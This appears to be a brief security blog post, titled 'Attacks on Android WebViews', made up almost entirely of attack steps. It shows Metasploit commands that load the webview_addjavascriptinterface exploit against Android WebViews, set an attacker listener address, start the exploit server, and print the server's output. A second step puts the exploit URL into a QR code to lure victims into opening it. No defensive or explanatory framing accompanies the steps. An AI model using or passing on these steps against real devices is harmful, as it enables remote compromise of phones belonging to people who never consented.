---
title: Attacks on Android WebViews
date: 2016-10-01 01:12:36
tags: Android
---

### 0x01 Metasploit
```
> use exploit/android/browser/webview_addjavascriptinterface
> set LHOST 192.168.0.110
> exploit
[*] Using URL: http://0.0.0.0:8080/xl7dev
[*] Local IP: http://192.168.0.110:8080/xl7dev
[*] Server started.
```

### 0x02 QR Code Attack
> qr "http://192.168.0.110:8080/xl7dev"